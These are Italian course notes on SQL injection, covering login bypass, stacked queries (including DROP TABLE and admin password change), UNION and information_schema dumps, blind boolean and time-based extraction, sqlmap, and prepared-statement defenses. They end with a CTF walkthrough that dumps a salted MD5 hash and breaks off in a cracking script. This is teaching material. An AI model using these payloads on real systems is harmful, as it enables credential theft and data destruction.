# SQL Injection Intro

> [!abstract] In una riga Inietti codice **SQL** tramite input non validato e prendi il controllo della query → del database.

## Cos'è

Quando l'app costruisce una query **concatenando** l'input dell'utente senza sanitizzarlo, l'attaccante può inserire frammenti di SQL che **cambiano la logica** della query. È la vulnerabilità da _input validation_ per eccellenza — e nonostante l'età, è ancora oggi tra le cause principali di data breach.

## Come funziona (bypass del login)

![[sqli-auth-bypass.svg|604]] 
_Con `admin'--` il `--` commenta il controllo della password: la query restituisce admin senza verificarne le credenziali._

## Tipi

- **In-band:** _error-based_ (sfrutta i messaggi d'errore) e _UNION-based_ (estrae dati con `UNION SELECT`).
- **Blind:** l'app non mostra i risultati, ma reagisce in modo diverso → _boolean-based_ o _time-based_ (ritardi).
- **Out-of-band:** i dati escono per un canale diverso (DNS/HTTP).

## Impatto

Lettura/modifica/cancellazione di dati, **bypass dell'autenticazione**, in certi casi esecuzione di comandi sul server del DB.

## Tool

**sqlmap** ([[Web Hacking Tools]]) automatizza rilevamento ed exploitation (fingerprint, dump, OS shell).

## Difese

- **Prepared statement / query parametrizzate** — la correzione vera: i dati non vengono mai interpretati come codice.
- Validazione input con **allowlist**.
- Account DB a **minimo privilegio**.
- WAF come strato secondario, non come unica difesa.

## Collegamenti

- ⬆️ [[Web Application Hacking]]
- ↔️ [[Authentication Attacks]] (bypass del login) · [[Web Hacking Tools]] (sqlmap)

---
preso da [[4 - CS Applitcation Level - Sintesi Web Security Part I]]

# SQL Injection Ethical Hacking

> [!abstract] In una frase La **SQL injection** sfrutta query costruite per **concatenazione di stringhe**: inserendo metacaratteri SQL nell'input, l'attaccante **esce dal contesto-dato ed entra nel contesto-codice**, alterando la struttura della query che il database esegue.

> [!info] Dove sta nei lab Trattata in **[[Ethl 0x04 web security p2]]** sotto **A05:2025-Injection**. È un caso particolare del tema generale dell'injection (vedi anche [[Path Traversal]] e XSS): _dati controllati dall'utente che un interprete — qui il DBMS — tratta come codice perché codice e dati non sono separati._

---

## 1. Perché funziona

> [!info] Il difetto base — vulnerability in WHERE clause (slide 28)
> 
> ```php
> $query = "SELECT * FROM products WHERE category = '" . $c . "'";
> //                                                  ^ input utente concatenato
> ```
> 
> Con `category=Pets` → query benigna. Ma `$c` è sotto controllo dell'attaccante. Mettendo un apice `'`:
> 
> ```
> category=Pets'
> →  SELECT * FROM products WHERE category = 'Pets''   ← sintassi rotta / errore
> ```
> 
> L'apice **chiude** la stringa prevista; tutto ciò che segue viene letto come **SQL, non come dato**. Es. `' OR '1'='1` rende la condizione sempre vera e restituisce tutte le righe.

> [!note] Il peccato originale Identico a path traversal, XSS, command injection: **l'app mescola codice (la query) e dati (l'input)**. Il DBMS non può distinguere la parte "scritta dallo sviluppatore" da quella "iniettata dall'utente" e le esegue entrambe.

---

## 2. Impatto (slide 27)

|Impatto|Esempio|
|---|---|
|**Retrieve hidden data**|leggere righe/tabelle non esposte dall'app|
|**Subvert application logic**|bypass del login (`' OR 1=1 --` )|
|**Retrieve data outside scope**|leggere altre tabelle (utenti, password) via `UNION`|
|**Execute code on the OS** (*)|in certi DBMS/configurazioni, RCE|

---

## 3. Le primitive fondamentali

### 3.1 Commentare la coda

> [!info] Il `--` (o `#`) Dopo aver iniettato il proprio SQL, bisogna **neutralizzare il resto** della query originale (es. l'apice di chiusura che altrimenti romperebbe la sintassi). Il commento SQL `--` (con spazio finale) o `#` "spegne" tutto ciò che viene dopo:
> 
> ```
> ' OR 1=1 -- '
>           ^^^ tutto da qui in poi è commento → la query originale finisce qui
> ```

### 3.2 UNION-based — leggere altri dati (slide 29)

> [!info] L'idea di UNION `UNION SELECT` **accoda** i risultati di una seconda query alla prima. Se l'output della prima è visibile in pagina, ci si "infila" dati arbitrari (versione del DB, contenuto di altre tabelle). **Vincolo**: la `SELECT` iniettata deve avere lo **stesso numero di colonne** (e tipi compatibili) della originale. Per questo nei payload reali compaiono tanti `null`/`0` di riempimento finché il numero torna.

Rilevare il DBMS:

|DBMS|Funzione versione|Payload tipo|
|---|---|---|
|MySQL / MS SQL|`@@version`|`' UNION SELECT @@version --`|
|Oracle|`version FROM v$instance`|`' UNION SELECT version FROM v$instance --`|
|PostgreSQL|`version()`|`' UNION SELECT version() --`|

Esempio dalle slide (PostgreSQL, 8 colonne):

```
/filter?category=x'+union+select+0,null,version(),0,0,'',null,null-- 
```

> Il `+` è la codifica URL dello spazio; i `0`/`null`/`''` riempiono le 8 colonne; `version()` va nella colonna il cui valore è visibile in pagina.

> [!tip] Come si trova il numero di colonne Due tecniche classiche (non nelle slide ma utili a capire i `null`):
> 
> - `ORDER BY 1`, `ORDER BY 2`, … finché dà errore → l'ultimo valore valido = numero colonne.
> - `UNION SELECT null`, `UNION SELECT null,null`, … finché non dà più errore di mismatch.

---

## 4. Quando l'output NON si vede — Blind SQLi (slide 30)

> [!info] Blind SQLi (caso comune) Spesso il risultato della query iniettata **non appare** in pagina. Si **inferisce** un bit/carattere alla volta osservando un comportamento osservabile (la pagina cambia? sì/no). Estrazione carattere per carattere con `SUBSTR`:
> 
> ```
> ... AND (SELECT SUBSTR((SELECT version()),1,1))='P'-- 
> ... AND (SELECT SUBSTR((SELECT version()),2,1))='o'-- 
> ```
> 
> Se la pagina si comporta come "vero", il carattere indovinato è giusto. Si itera su tutte le posizioni e su tutti i caratteri possibili → si ricostruisce il dato.

### 4.1 Time-based Blind — il canale temporale

> [!info] Quando nemmeno il comportamento cambia Se la pagina è identica sia per "vero" che per "falso", si usa il **tempo** come canale laterale: si forza un `sleep` **solo se** la condizione è vera.
> 
> ```
> '; SELECT CASE WHEN SUBSTR((SELECT version()),1,1)='P'
>      THEN pg_sleep(5) ELSE pg_sleep(0) END-- 
> ```
> 
> Se la risposta tarda 5 secondi → la condizione era vera (il carattere era 'P'). Lentissimo ma funziona **completamente alla cieca**.

> [!tip] Concetto chiave da spiegare all'esame Boolean-based e time-based sono entrambe **esfiltrazione un bit alla volta tramite canale laterale**. Cambia solo il segnale osservato: contenuto della pagina (boolean) vs tempo di risposta (time-based). Si usa il time-based quando il boolean non è osservabile.

---

## 5. Second-Order (Stored) SQLi (slide 31)

> [!info] L'app prende l'input da una richiesta e lo **memorizza**; l'injection scatta **più tardi**, quando quel dato salvato viene riutilizzato in un'altra query senza essere ri-sanificato. È l'analogo concettuale dello **Stored XSS** (vedi [[Ethl 0x04 web security p2]]): il payload "dorme" e si attiva in un secondo momento, spesso in un contesto diverso da dove è entrato → difficile da individuare con test ingenui (il punto di iniezione e il punto di esecuzione sono separati).

---

## 6. Automazione — sqlmap (slide 33)

> [!warning] "Make sure you understand and explain what you are doing and why it worked/didn't work" Questa frase è **letteralmente** l'istruzione d'esame su sqlmap. Il tool automatizza rilevamento ed exploit:
> 
> ```
> sqlmap -u "https://<target>/filter?category=Pets" --method GET
> ```
> 
> Dall'output del lab impari a **leggere** cosa fa, passo per passo:
> 
> - rileva che il parametro `category` è dinamico;
> - prova **boolean-based blind** (WHERE/HAVING);
> - identifica il backend (es. **PostgreSQL**) con test euristici;
> - testa **error-based**, **stacked queries**, **time-based blind**, **UNION**…
> 
> All'esame **non** conta lanciare il comando a memoria: conta **spiegare quale tecnica ha funzionato e perché** (es. _"time-based blind perché l'output non era riflesso in pagina, ma il parametro influenzava il tempo di risposta"_).

---

## 7. Difese

> [!success]
> 
> - **Prepared statements / query parametrizzate** — _la_ difesa. I dati vengono passati separatamente dalla query e **non** sono mai interpretati come SQL:
>     
>     ```sql
>     SELECT * FROM products WHERE category = ?    -- il '?' è un placeholder
>     ```
>     
>     Qualunque cosa metta l'utente resta un _valore_, non può cambiare la struttura.
> - **ORM** usati correttamente (che sotto usano prepared statements).
> - **Escaping context-aware** come ripiego, mai come difesa primaria.
> - **Privilegi minimi** sul DB: l'account dell'app non deve poter leggere tabelle di sistema o eseguire comandi OS.
> - **Messaggi d'errore non verbosi**: riducono le info per l'attaccante (e l'efficacia dell'error-based).
> - **Allowlist** per input strutturati (es. `category` ∈ {Pets, Gifts, …}).

> [!info] Perché i prepared statement risolvono il problema alla radice Concatenare stringhe mescola codice e dati. Il prepared statement li **separa fisicamente**: prima il DB riceve la query _con i buchi_ (`?`) e ne fissa la struttura; poi riceve i valori, che vengono inseriti nei buchi _come dati puri_. Anche se il valore è `' OR 1=1 --` , non viene mai parsato come SQL: è solo una stringa cercata nella colonna `category`.

---

## 8. Trappole d'esame

> [!danger] Domande "spiega questo / perché funziona"
> 
> 1. **Perché un `'` rompe/altera la query** → chiude la stringa-dato; il resto è letto come SQL.
> 2. **A cosa serve `--` (o `#`)** → commenta la coda della query originale per non rompere la sintassi.
> 3. **UNION-based: il vincolo** → stesso numero (e tipi) di colonne → da qui i `null`/`0` di padding.
> 4. **Come si trova il numero di colonne** → `ORDER BY n` crescente fino all'errore, o `UNION SELECT null,null,…`.
> 5. **Blind vs Time-based** → output non visibile → si inferiscono i bit dal _comportamento_ (boolean) o dal _tempo_ (`pg_sleep`) come canale laterale.
> 6. **Quando usare time-based** → quando nemmeno il comportamento della pagina cambia tra vero e falso.
> 7. **Second-order SQLi** → payload memorizzato che scatta in una query successiva; punto d'iniezione ≠ punto d'esecuzione (analogo Stored XSS).
> 8. **sqlmap: quale tecnica e perché** → saper leggere l'output e motivare la tecnica vincente.
> 9. **Perché i prepared statement risolvono** → separano fisicamente struttura (query) e valori (dati); l'input non è mai parsato come SQL.
> 10. **Come si rileva il DBMS** → funzioni-versione specifiche (`@@version`, `version()`, `v$instance`) via UNION o error/time-based.

> [!todo] Practice (lab 0x04, slide 32) _Trova manualmente una SQLi in Juice Shop._ Suggerimento concettuale: il **login** è il sospetto classico — pensa a una query tipo `WHERE email='<input>' AND password='<input>'`. Cosa succede se l'input nel campo email chiude l'apice e commenta il resto (`' --` )? Verifica _perché_ il comportamento cambia (quale parte della query hai "spento").

---

## 9. Richiamo attivo (a libro chiuso)

> [!question] Verifica
> 
> 1. Dato `WHERE category='$c'`, mostra come `$c` può rendere la condizione sempre vera e cosa fa il `--` finale.
> 2. Qual è il vincolo di una UNION-based SQLi e come lo soddisfi nella pratica?
> 3. Come scopri quante colonne ha la query originale?
> 4. Spiega la differenza tra boolean-based blind e time-based blind, e quando useresti la seconda.
> 5. Cos'è una second-order SQLi e perché è difficile da trovare?
> 6. Perché un prepared statement neutralizza `' OR 1=1 --` anche se l'utente lo inserisce?
> 7. Come rileveresti che il backend è PostgreSQL piuttosto che MySQL?
> 8. Su sqlmap: cosa significa che un parametro è "time-based blind injectable" e perché?

---

> [!quote] Idea da portare a casa La SQLi è il tema dell'injection applicato al database: **input dell'utente che il DBMS esegue come SQL perché codice e dati sono stati concatenati**. Visibile → UNION; invisibile → blind (boolean o time-based); differita → second-order. La difesa non è filtrare gli apici (aggirabile), ma **separare struttura e dati** con i prepared statement, più privilegi minimi sul DB.

# SQL Injection corso di Cybersecurity 

## Cos'è SQL?

**SQL (Structured Query Language)** è il linguaggio dichiarativo standard utilizzato per interrogare e gestire i database relazionali (RDBMS). I database relazionali si basano sul concetto di **tabelle** (composte da righe e colonne) dove vengono memorizzati i dati strutturati degli utenti.

_Arricchimento:_ A differenza dei database NoSQL (come MongoDB), i database relazionali (come MySQL, PostgreSQL, Oracle, SQL Server) richiedono uno schema predefinito e garantiscono le proprietà ACID (Atomicità, Coerenza, Isolamento, Durabilità) per le transazioni.

Esempio di tabella `users`:

|**user**|**password**|**age**|
|---|---|---|
|admin|1f4sdge!|37|
|mauro|mkfln34.|30|
|matteo|a4njDa!|42|

> **Nota di sicurezza:** Nei siti web reali, le password NON dovrebbero mai essere memorizzate in chiaro come nell'esempio sopra, ma sempre sotto forma di hash (es. utilizzando bcrypt o Argon2) con un salt univoco.

### Sintassi SQL di Base

Ecco le operazioni fondamentali (CRUD - Create, Read, Update, Delete):

- **Recuperare record (SELECT):**
    
    ```SQL
    SELECT * FROM users WHERE user='admin' AND password='1f4sdge!';
    ```
    
- **Aggiungere nuovi record (INSERT):**
    
    ```SQL
    INSERT INTO users VALUES ('karl', 's3cr3t', 23);
    ```
    
- **Aggiornare record esistenti (UPDATE):**
    
    ```SQL
    UPDATE users SET age=age+1;
    ```
    
- **Rimuovere record (DELETE):**
    
    ```SQL
    DELETE FROM users WHERE age < 25;
    ```
    
- **Rimuovere una tabella (DROP):**
    
    ```SQL
    DROP TABLE users;
    ```
    

---

## SQL Injection (SQLi) in Sintesi
![[Pasted image 20251117152059.png]]

La **SQL Injection (SQLi)** è una vulnerabilità di validazione dell'input che si verifica quando dati non fidati forniti dall'utente vengono concatenati direttamente all'interno di una query SQL inviata al database. È un'istanza specifica delle vulnerabilità di **Code Injection**, ma nel contesto dei database.

L'interprete SQL non riesce a distinguere tra il codice legittimo della query e i dati forniti dall'utente, eseguendo quindi comandi non previsti dallo sviluppatore.

Impatto:

Fornendo un payload creato ad hoc, un attaccante può alterare la logica della query e:

- Ottenere accesso non autorizzato a dati sensibili (Confidenzialità).
    
- Alterare l'integrità dei dati nel database (Integrità).
    
- Eseguire attacchi distruttivi (es. eliminare tabelle) (Disponibilità).
    

![[Pasted image 20260128230600.png]]
_La celebre vignetta di XKCD che illustra un attacco distruttivo SQLi dove il nome dello studente viene sanitizzato male, portando alla cancellazione dei record scolastici._

### Esempio Base: Bypass dell'Autenticazione

Consideriamo un codice PHP vulnerabile per il login:
```php
<?php
$db = new PDO(CONNECTION_STRING, DB_USER, DB_PASS);
// VULNERABILE: Concatenazione diretta dell'input utente
$query = "SELECT * FROM users WHERE user = '" . $_POST["user"] . "' AND password = '" . $_POST["password"] . "'";
$sth = $db->query($query);
$user = $sth->fetch();

if ($user !== false) {
    // login effettuato, avvia sessione
    start_session();
    $_SESSION["user"] = $user["user"];
} else {
    // login fallito
}
?>
```
Sono le peggiori 10 line di codice mostrate dal prof: ha un botto di vulnerabilità

#### Caso d'uso legittimo

- User: `admin`
    
- Password: `1f4sdge!`
    
- Query risultante:
    ```SQL
    SELECT * FROM users WHERE user='admin' AND password='1f4sdge!'
    ```
    

#### Exploit: Login senza password (SQLi Tautologica)

L'attaccante usa l'input:

- User: `admin' --`
    
- Password: `qualsiasi`
    

La query diventa:
```SQL
SELECT * FROM users WHERE user='admin' -- ' AND password='qualsiasi'
```

_Arricchimento:_ Il simbolo `--` (spesso seguito da uno spazio) indica l'inizio di un commento in SQL. Tutto ciò che segue viene ignorato dal database. In questo modo, la parte `AND password='...'` viene disattivata, e la query ritorna l'utente 'admin' senza controllarne la password.

#### Exploit Alternativo (`OR` condition)

- User: `admin`
    
- Password: `' OR password LIKE '%`
    

Query risultante:
```SQL
SELECT * FROM users WHERE user='admin' AND password='' OR password LIKE '%';
```

La condizione `LIKE '%'` è sempre vera (matcha qualsiasi sequenza di caratteri). Poiché c'è un `OR`, l'intera clausola `WHERE` diventa vera, autenticando spesso l'attaccante come il primo utente nella tabella (solitamente l'amministratore).

---

## Tecniche Avanzate di SQL Injection

## Stacking Queries (Query Impilate)

Le **Query Impilate** si riferiscono alla possibilità di eseguire istruzioni SQL multiple e distinte in un'unica chiamata al database, tipicamente separandole con un punto e virgola (`;`).

Se la configurazione del server di database abilita questa funzione (spesso è disabilitata di default nei driver moderni rivolti al web), apre la porta a gravi attacchi che possono compromettere l'integrità e la disponibilità del database.

L'attacco funziona "evadendo" dalla query prevista e "impilando" una nuova query dannosa subito dopo.

### Esempio 1: Aggiungere un Nuovo Utente

Un attaccante può iniettare un nuovo utente nella tabella `users`.

- **Input dell'Attaccante:** `'; INSERT INTO users (user, password, age) VALUES ('attacker', 'mypwd', 1) -- -`
    
- **SQL Risultante Inviato al DB:**
    ```SQL
    SELECT * FROM users WHERE user=''; 
    INSERT INTO users (user, password, age) VALUES ('attacker', 'mypwd', 1);
    -- -' AND password='whatever'
    ```
    
- **Come Funziona:**
    
    1. La prima query (`SELECT...`) fallisce in modo innocuo.
        
    2. Il database esegue quindi la _seconda_ query, un'istruzione `INSERT` dannosa, creando un nuovo utente.
        
    3. Il `-- -` (uno spazio è cruciale dopo i due trattini) è un commento SQL, che neutralizza il resto della stringa di query originale (`' AND password='whatever'`), prevenendo errori di sintassi.
        

### Esempio 2: Modificare Dati (Cambiare Password Admin)

Un attaccante può prendere il controllo di un account admin modificandone la password.

- **Input dell'Attaccante:** `'; UPDATE users SET password='newpwd' WHERE user='admin'-- -`
    
- **SQL Risultante Inviato al DB:**
    
    ```SQL
    SELECT * FROM users WHERE user=''; 
    UPDATE users SET password='newpwd' WHERE user='admin';
    -- -' AND password=""
    ```
    

### Esempio 3: Distruggere Dati (Eliminare una Tabella)

Questo è il tipo più distruttivo di attacco stacked query, in cui l'attaccante elimina un'intera tabella.

- **Input dell'Attaccante:** `'; DROP TABLE users -- -`
    
- **SQL Risultante Inviato al DB:**
    
    ```SQL
    SELECT * FROM users WHERE user=''; 
    DROP TABLE users;
    -- - AND password=";
    ```
    
    Questo comando elimina completamente la tabella `users`, portando a una catastrofica perdita di dati.
    

---

## Il "Piccolo Bobby Tables" (Monito)

Questa famosa vignetta di xkcd è l'illustrazione più nota di un attacco SQL injection di tipo stacked query.

![[Pasted image 20260128231443.png]]

[Immagine della vignetta xkcd "Little Bobby Tables"](https://xkcd.com/327/)

Nella vignetta, una madre chiama suo figlio `Robert'); DROP TABLE Students;--`, nome che, una volta inserito nel database scolastico non protetto, provoca la cancellazione di tutti i record degli studenti.

La battuta finale della vignetta, "Spero che abbiate imparato a sanificare i vostri input del database," è la lezione fondamentale. Nello sviluppo moderno, la best practice non è solo "sanificare" (che è difficile e soggetto a errori), ma usare **query parametrizzate** (prepared statements), che separano la _logica_ della query dai _dati_, rendendo impossibile questa intera classe di attacchi.

---

## Attacco UNION (Fuga di Dati da Altre Tabelle)

Questo è un tipo diverso di SQL Injection che non modifica o distrugge i dati, ma li _ruba_. Questo attacco usa l'operatore SQL `UNION` per "unire" i risultati della query legittima con i risultati di una nuova query `SELECT` dannosa.

### Esempio di Codice Vulnerabile

Questo codice PHP è vulnerabile perché costruisce una query concatenando l'input dell'utente (`$_GET["search"]`) direttamente nella stringa.

```PHP
<?php
$db = new PDO(CONNECTION_STRING, DB_USER, DB_PASS);
start_session();

// VULNERABILE: $_GET["search"] è concatenato direttamente
$query = "SELECT sender, content FROM messages WHERE
          receiver = '".$_SESSION["user"]."' AND
          content LIKE '%".$_GET["search"]. "%'";

$sth = $db->query($query);
foreach ($sth as $row) {
    echo "Sender:".$row["sender"];
    echo "Content: ".$row["content"];
}
?>
```

### Il Payload dell'Attacco

Un attaccante può usare questo parametro `search` per rubare nomi utente e password dalla tabella `users`.

- **Input dell'Attaccante:** `' UNION SELECT user, password FROM users -- -`
    
- **SQL Risultante Inviato al DB:**
    
    ```SQL
    SELECT sender, content FROM messages WHERE 
    receiver='attacker' AND content LIKE '%' 
    UNION SELECT user, password FROM users 
    -- - %'
    ```
    

### Come Funziona e Requisiti

1. **`'` (Apostrofo):** Il primo apostrofo nel payload (`'`) chiude la stringa `content LIKE '%`.
    
2. **`UNION`:** L'operatore `UNION` aggiunge i risultati di una nuova query.
    
3. **Query Dannosa:** L'attaccante _indovina_ che esista una tabella chiamata `users` e che abbia colonne `user` e `password`.
    
4. **`-- -` (Commento):** Questo commenta il `%'` finale della query originale per evitare un errore di sintassi.
    

L'applicazione ora eseguirà questa query combinata. I risultati mostreranno prima eventuali messaggi legittimi, seguiti da un elenco completo di tutti i nomi utente e password dalla tabella `users`.

**Perché un attacco UNION funzioni, devono essere soddisfatte due condizioni:**

1. La query originale deve essere un'istruzione `SELECT`.
    
2. L'istruzione `SELECT` dannosa deve restituire lo **stesso numero di colonne** della query originale. (Qui, la query originale selezionava `sender, content` (2 colonne), quindi la query dell'attaccante `user, password` (2 colonne) corrisponde perfettamente).
    
3. I tipi di dati delle colonne devono essere compatibili tra le due query.
    

---

## Ricognizione del Database (Scoprire i Metadati)

Come fa un attaccante a sapere che la tabella si chiama `users` o che le colonne sono `user` e `password`? Può eseguire una ricognizione _interrogando i metadati stessi del database_.

La maggior parte dei database SQL mantiene un database speciale e integrato che descrive tutti gli altri database, tabelle e colonne.

- **information_schema** (per MySQL, PostgreSQL, ecc.)
    
    Questo è un database standard che può essere interrogato come qualsiasi altro.
    
    - Per trovare tutti i nomi delle tabelle:
        
        ...UNION SELECT table_name, table_schema FROM information_schema.tables -- -
        
    - Per trovare tutti i nomi delle colonne di una tabella specifica:
        
        ...UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'users' -- -
        
- **sqlite_master** (per SQLite)
    
    SQLite usa una tabella master speciale.
    
    - Per trovare tutte le tabelle:
        
        ...UNION SELECT name, tbl_name FROM sqlite_master WHERE type='table' -- -
        

Utilizzando queste tabelle di metadati, un attaccante può mappare alla cieca l'intera struttura del database, trovare tabelle sensibili (`users`, `credit_cards`) e quindi lanciare un attacco `UNION` per estrarne il contenuto.

---

## Second-Order SQL Injection (Stored SQLi)
![[Pasted image 20251117154202.png]]

In questo scenario, il payload malevolo viene prima **memorizzato** nel database (in una fase in cui l'input potrebbe essere sanitizzato correttamente o considerato "sicuro") e poi **eseguito** in una seconda query successiva che utilizza quel dato senza adeguata validazione. Ad esempio, il dato viene memorizzato per essere sanitizzato in un secondo momento, ma leggendolo esegue la query maledetta.

**Esempio:**

1. **Inserimento:** Un attaccante si registra con un username malevolo: `'; UPDATE users SET password='...' WHERE user='admin'--`. L'applicazione lo salva correttamente nel DB.
    
2. **Esecuzione:** Quando l'applicazione usa questo username in una seconda query (es. per mostrare il profilo o registrare un log), la stringa viene concatenata in una nuova query SQL ed eseguita, attivando l'attacco. 
```sql
$query = "SELECT sender, content FROM messages WHERE
receiver='" . $_SESSION["user"] . "' AND content LIKE '%" . $_GET["search"] . "%'";
 
 che diventerebbe 
 
SELECT * FROM messages WHERE receiver = ''; UPDATE TABLE users SET
password='newpwd' WHERE user='admin' -- -' AND content LIKE '%%'
```
    

---

## Esfiltrazione dei Metadati del Database

Se non conosciamo la struttura del database, possiamo interrogarlo per chiedergli i suoi stessi metadati. La maggior parte dei DBMS moderni ha un database standard chiamato `INFORMATION_SCHEMA` (o tabelle di sistema specifiche come `sqlite_master` in SQLite).

- `information_schema.tables`: Contiene i nomi di tutte le tabelle.
    
- `information_schema.columns`: Contiene i nomi delle colonne per ogni tabella.
    

Esempio per SQLite per trovare i nomi delle tabelle:

SQL

```
SELECT name FROM sqlite_master WHERE type='table';
```


---

## SQL Injection "Cieche" (Blind SQLi)

Si verifica quando l'applicazione è vulnerabile, ma non mostra direttamente i risultati della query o gli errori del database nella risposta HTTP. L'attaccante deve quindi "fare domande" al database e dedurre le risposte dal comportamento dell'applicazione.

### Blind SQLi: Comportamento Condizionale (Boolean-based)

L'applicazione potrebbe mostrare un messaggio generico "OK" o "Errore", oppure mostrare o meno un contenuto, a seconda se la query ritorna vero o falso.

Esempio: Indovinare la password dell'amministratore carattere per carattere.

Payload:
```SQL
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'k
```

Se l'applicazione risponde "OK" (o mostra il contenuto normale), sappiamo che il primo carattere della password è maggiore di 'k'. Possiamo usare la ricerca binaria per trovare il carattere esatto.

### Blind SQLi: Errore Condizionale (Error-based)

Se l'applicazione non mostra dati ma mostra errori generici del DB, possiamo forzare un errore SQL solo quando una condizione è vera.

Payload (esempio concettuale):

```SQL
xyz' AND (SELECT CASE WHEN (condizione_da_testare) THEN 1/0 ELSE 'a' END)='a
```

Se `condizione_da_testare` è VERA, viene eseguita una divisione per zero (`1/0`), causando un errore che l'attaccante può rilevare.

### Blind SQLi: Ritardo Temporale (Time-based)

Se l'applicazione non fornisce alcun feedback visivo o di errore, l'attaccante può istruire il database ad attendere per un certo numero di secondi se una condizione è vera.

Payload (esempio per MS SQL Server):

```SQL
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:10'--
```

Se il server impiega più di 10 secondi a rispondere, l'attaccante sa che la condizione è vera. Da notare che ogni richiesta errata che produce errori sono tracciati nei Log.

Arricchimento: Su MySQL si usa spesso SLEEP(n), su PostgreSQL pg_sleep(n). Questa tecnica è lenta e può essere influenzata dal carico di rete.

---
## Prevenzione delle SQL Injection

### Difesa Primaria: Prepared Statements (Query Parametrizzate)

L'uso di **Prepared Statements** è il metodo più efficace per prevenire la SQLi. Essi separano la struttura della query dai dati. Il database compila la query SQL prima che i dati vengano inseriti, assicurando che l'input dell'utente sia trattato sempre e solo come dati (parametri), mai come codice eseguibile.

Esempio sicuro in PHP (PDO):

```PHP
$db = new PDO(CONNECTION_STRING, DB_USER, DB_PASS);
// Il '?' è un placeholder
$query = "SELECT * FROM users WHERE user = ? AND password = ?";
$sth = $db->prepare($query);
// I dati vengono associati in modo sicuro ai placeholder
$sth->bindValue(1, $_POST["user"]);
$sth->bindValue(2, $_POST["password"]);
$sth->execute();
$user = $sth->fetch();
```

Anche se visivamente nel codice PHP sembrano operazioni simili (invio una query e invio dei dati), ciò che avviene "sotto il cofano" a livello di comunicazione col Database è profondamente diverso.

Ecco la differenza tecnica spiegata passo dopo passo, basata sulle slide del corso.

#### 1. Concatenazione di stringhe (Il metodo Vulnerabile)

Quando usi la concatenazione (es. Slide 33), il tuo codice PHP costruisce una **singola lunga stringa** che contiene sia i comandi SQL che i dati dell'utente, e poi la spedisce al database.

- **Cosa riceve il Database:** Una frase unica.
- **Il problema:** Il Database deve analizzare (fare il _parsing_) di quella frase da zero. Non ha modo di distinguere quali caratteri sono stati scritti dal programmatore (codice sicuro) e quali sono stati inseriti dall'utente.
- **Risultato:** Se l'utente inserisce caratteri speciali SQL (come `' OR '1'='1`), il parser del database li interpreta come **comandi**, modificando la logica della query originale (ad esempio, aggirando il login).

#### 2. Prepared Statements (Il metodo Sicuro)

Con i Prepared Statements (es. Slide 47), la comunicazione avviene in **due fasi separate**. Non si invia mai una stringa unica mescolata.

##### Fase 1: Preparazione (Prepare)

Tu invii al database solo la struttura della query con i placeholder (`?`):

```
SELECT * FROM users WHERE user = ? AND password = ?
```

- Il Database riceve questa struttura, la analizza, la compila e la ottimizza **prima** che arrivi qualsiasi dato.
- In questo momento, il Database decide che la query ha una struttura fissa: _"Seleziona dalla tabella utenti dove l'utente è [qualcosa] e la password è [qualcosa]"_. La struttura logica è ormai "congelata".

##### Fase 2: Associazione ed Esecuzione (Bind & Execute)

Successivamente, invii i valori (es. `$_POST["user"]`).

- Il Database prende questi valori e li inserisce nei "buchi" (`?`) che aveva preparato.
- **Il punto cruciale:** Poiché la query è già stata compilata nella Fase 1, il Database tratterà **qualsiasi cosa** tu invii nella Fase 2 esclusivamente come un **dato letterale** (una stringa di testo), mai come codice eseguibile.

#### Esempio Pratico della Differenza

Immagina che un attaccante inserisca come nome utente: `' OR '1'='1`.

- **Con Concatenazione:** Il DB legge: `SELECT ... WHERE user = '' OR '1'='1'`. La logica cambia: l'istruzione `OR` diventa attiva e il login viene bypassato.
- **Con Prepared Statements:** Il DB ha già deciso che il primo `?` è un contenitore di dati. Quindi cercherà nel database un utente che si chiami _letteralmente_ così:
    
    > "Cercami un tizio il cui nome sia la stringa `' OR '1'='1`". Ovviamente non lo troverà, e l'attacco fallisce.
    


### Difese Secondarie (Defense in Depth)

- **Input Validation (Whitelisting):** Se non puoi usare prepared statements (es. se l'input utente deve scegliere il nome di una tabella per un `ORDER BY`), usa una whitelist rigorosa di valori consentiti (es. solo caratteri alfanumerici).
    
- **Principio del Minimo Privilegio:** L'utente del database usato dall'applicazione web dovrebbe avere solo i permessi strettamente necessari (es. solo `SELECT`, `INSERT`, `UPDATE` sulle tabelle specifiche, mai `DROP` o permessi amministrativi).



---

## Caso Studio Reale: Webkinz (2020)

Nell'aprile 2020, un attacco hacker ha sfruttato una SQL Injection nel gioco per bambini Webkinz, portando all'esfiltrazione di 23 milioni di username e password (memorizzate come hash MD5 con salt, ma comunque vulnerabili al cracking se la password è debole).

L'attacco è stato possibile perché un parametro non era sanitizzato correttamente, generando un errore SQL visibile che ha confermato la vulnerabilità agli attaccanti.

---

## Training Challenge #04 (Walkthrough)

Scenario: Dobbiamo accedere all'account del criminale "Collins Hackle" sul servizio "CrimeMail".

Indizio: hash = md5(password + salt).

### Analisi e Identificazione

1. Il sito ha una pagina di login e una di recupero password (`forgot.php`).
    
2. Inserendo un apice `'` nel campo username di `forgot.php`, otteniamo un **errore del database MySQL**. Questo indica una potenziale SQL Injection Error-Based.
    

### Esfiltrazione (Exploitation)

Usiamo una SQLi UNION-Based nella pagina vulnerabile per estrarre dati.

1. **Dump dello Schema:** Interroghiamo `INFORMATION_SCHEMA.COLUMNS` per trovare i nomi delle tabelle e delle colonne interessanti.
    
    - Payload: `' UNION SELECT CONCAT(TABLE_NAME,":",COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS#`
        
    - _Risultato:_ Troviamo una tabella `users` con colonne `userid`, `username`, `pass_salt`, `pass_md5`, `hint`.
        
2. **Dump della tabella Users:** Estraiamo i dati dell'utente target.
    
    - Payload: `' UNION SELECT CONCAT(userid, ":", username, ":", pass_salt, ":", pass_md5) FROM users#`
        
    - _Risultato per Collins Hackle:_ `5:c.hackle:yhbG:f2b31b3a7a7c41093321d0c98c37f5ad`
        
    - Abbiamo il salt (`yhbG`) e l'hash MD5 della password.
        

### Cracking della Password

Sapendo che l'hash è `md5(password + salt)`, possiamo usare uno script (o strumenti come John the Ripper/Hashcat) con un dizionario (es. `rockyou.txt`) per trovare la password.

Script Python di esempio:

Python

```
import hashlib
salt = "yhbG"
target_hash = "f2b31b3a7a7c41093321d0c98c37f5ad"
with open("rockyou.txt", "r", encoding="latin-1") as f:
    for line in f:
        password = line.strip()
